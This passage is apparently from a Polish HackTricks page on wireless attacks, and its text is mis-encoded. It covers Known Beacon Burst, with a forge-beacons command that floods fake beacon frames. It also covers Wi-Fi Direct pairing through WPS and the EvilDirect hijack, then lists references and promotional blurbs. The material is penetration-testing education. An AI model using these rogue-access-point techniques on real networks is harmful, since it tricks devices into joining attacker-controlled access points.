Atak **Known Beacon Burst** polega na **szybkim nadawaniu ramek beacon dla kaÅ¼dego ESSID wymienionego w pliku**. Tworzy to gÄ™ste Å›rodowisko faÅ‚szywych sieci, znacznie zwiÄ™kszajÄ…c prawdopodobieÅ„stwo podÅ‚Ä…czenia siÄ™ urzÄ…dzeÅ„ do podstÄ™pnej AP, zwÅ‚aszcza gdy jest to poÅ‚Ä…czone z atakiem MANA. Ta technika wykorzystuje prÄ™dkoÅ›Ä‡ i iloÅ›Ä‡, aby przytÅ‚oczyÄ‡ mechanizmy wyboru sieci urzÄ…dzeÅ„.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protokÃ³Å‚ umoÅ¼liwiajÄ…cy urzÄ…dzeniom bezpoÅ›rednie poÅ‚Ä…czenie ze sobÄ… za pomocÄ… Wi-Fi, bez koniecznoÅ›ci tradycyjnego punktu dostÄ™pu bezprzewodowego. Ta funkcjonalnoÅ›Ä‡ jest zintegrowana w rÃ³Å¼ne urzÄ…dzenia Internetu Rzeczy (IoT), takie jak drukarki i telewizory, uÅ‚atwiajÄ…c bezpoÅ›redniÄ… komunikacjÄ™ urzÄ…dzeÅ„. IstotnÄ… cechÄ… Wi-Fi Direct jest to, Å¼e jedno urzÄ…dzenie przejmuje rolÄ™ punktu dostÄ™pu, znanego jako wÅ‚aÅ›ciciel grupy, aby zarzÄ…dzaÄ‡ poÅ‚Ä…czeniem.

BezpieczeÅ„stwo poÅ‚Ä…czeÅ„ Wi-Fi Direct jest ustanawiane za pomocÄ… **Wi-Fi Protected Setup (WPS)**, ktÃ³ry obsÅ‚uguje kilka metod bezpiecznego parowania, w tym:

* **Konfiguracja za pomocÄ… przycisku (PBC)**
* **Wprowadzanie PIN-u**
* **Komunikacja w polu bliskiego zasiÄ™gu (NFC)**

Te metody, zwÅ‚aszcza wprowadzanie PIN-u, sÄ… podatne na te same podatnoÅ›ci co WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem podobnych wektorÃ³w ataku.

### Przechwytywanie EvilDirect

**Przechwytywanie EvilDirect** to atak specyficzny dla Wi-Fi Direct. Odzwierciedla koncepcjÄ™ ataku Evil Twin, ale celuje w poÅ‚Ä…czenia Wi-Fi Direct. W tym scenariuszu atakujÄ…cy podszywa siÄ™ pod prawowitego wÅ‚aÅ›ciciela grupy w celu oszukania urzÄ…dzeÅ„ i zmuszenia ich do poÅ‚Ä…czenia siÄ™ z zÅ‚oÅ›liwÄ… jednostkÄ…. Ten sposÃ³b dziaÅ‚ania moÅ¼na zrealizowaÄ‡ za pomocÄ… narzÄ™dzi takich jak `airbase-ng`, podajÄ…c kanaÅ‚, ESSID i adres MAC podszywanego urzÄ…dzenia:

## OdnoÅ›niki

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: SprawdÅº [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie za pomocÄ… Facebooka i imitacja WPA w portalach typu captive)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zanurz siÄ™ w treÅ›ciach, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania hakerstwa

**AktualnoÅ›ci hakerskie na Å¼ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnoÅ›ciom i spostrzeÅ¼eniom na Å¼ywo

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>ZdobÄ…dÅº wiedzÄ™ na temat hakerskich atakÃ³w na AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
